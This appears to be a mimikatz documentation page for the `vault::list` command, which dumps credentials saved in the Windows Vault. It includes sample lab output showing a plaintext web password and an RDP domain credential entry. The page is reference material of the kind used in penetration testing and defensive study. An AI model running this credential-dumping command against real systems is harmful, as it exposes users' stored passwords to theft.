# list

`vault::list` lists saved credentials in the Windows Vault such as scheduled tasks, RDP, Internet Explorer for the current user. More information can be found at Benjamin's guide [howto-\~-scheduled-tasks-credentials](https://github.com/gentilkiwi/mimikatz/wiki/howto-\~-scheduled-tasks-credentials).

```
mimikatz # vault::list

Vault : {4bf4c442-9b8a-41a0-b380-dd4a704ddb28}
        Name       : Web Credentials
        Path       : C:\Users\m3g9tr0n\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
        Items (1)
          0.    Internet Explorer
                Type            : {3ccd5499-87a8-4b10-a215-608888dd3b55}
                LastWritten     : 13/12/2021 21:33:59
                Flags           : 00000400
                Ressource       : [STRING] https://login.live.com/
                Identity        : [STRING] mymail@hotmail.com
                Authenticator   :
                PackageSid      :
                *Authenticator* : [STRING] MySuperDuperPass

Vault : {77bc582b-f0a6-4e15-4e80-61736b6f3b29}
        Name       : Windows Credentials
        Path       : C:\Users\m3g9tr0n\AppData\Local\Microsoft\Vault
        Items (1)
          0.    (null)
                Type            : {3e0e35be-1b77-43e7-b873-aed901b6275b}
                LastWritten     : 12/12/2021 00:39:57
                Flags           : 00000000
                Ressource       : [STRING] Domain:target=TERMSRV/192.168.0.224
                Identity        : [STRING] hacklab\m3g9tr0n
                Authenticator   :
                PackageSid      :
                *Authenticator* : [BYTE*]

                *** Domain Password ***
```
